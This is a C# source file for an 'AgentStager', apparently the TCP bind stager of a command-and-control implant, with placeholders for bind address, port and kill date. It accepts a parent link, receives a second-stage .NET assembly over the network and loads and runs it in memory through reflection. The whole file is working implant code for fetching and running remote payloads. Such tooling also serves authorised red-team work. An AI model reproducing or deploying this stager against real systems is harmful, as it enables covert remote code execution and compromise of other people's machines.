using System;
using System.Reflection;
using System.Text;

class AgentStager
{
    static StagerStatus StagerStatus = StagerStatus.Staging;

    static string AgentID;

    static readonly string BindAddress = "<<BindAddress>";
    static readonly int BindPort = int.Parse("<<BindPort>>");
    static readonly DateTime KillDate = DateTime.Parse("<<KillDate>>");

    public AgentStager()
    {
        Execute();
    }

    static void Main(string[] args)
    {
        new AgentStager();
    }

    public static void Execute()
    {
        AgentID = Misc.GeneratePseudoRandomString(8);

        var crypto = new CryptoController();

        try
        {
            var commModule = new TcpCommModule(BindAddress, BindPort);
            commModule.SetMetadata(AgentID);
            commModule.Start(crypto);

            while (StagerStatus == StagerStatus.Staging)
            {
                if (commModule.RecvData(out AgentMessage message) == true)
                {
                    if (message.Data != null && message.Data.Command.Equals("IncomingLink", StringComparison.OrdinalIgnoreCase))
                    {
                        commModule.SetParentID(Encoding.UTF8.GetString(message.Data.Data));
                        commModule.QueueStageRequest();
                    }
                    else if (message.Data.Command.Equals("StageOne", StringComparison.OrdinalIgnoreCase))
                    {
                        StagerStatus = StagerStatus.Staged;
                        commModule.Stop();

                        var asm = Assembly.Load(message.Data.Data);
                        var type = asm.GetType("AgentStage");
                        var instance = Activator.CreateInstance(type);
                        type.InvokeMember(
                            "TcpEntryPoint",
                            BindingFlags.Public | BindingFlags.Static | BindingFlags.InvokeMethod,
                            null,
                            instance,
                            new object[] { AgentID, KillDate, BindAddress, BindPort });
                    }
                }
            }
        }
        catch (Exception e)
        {
            Console.Error.WriteLine(e.StackTrace);
        }
    }
}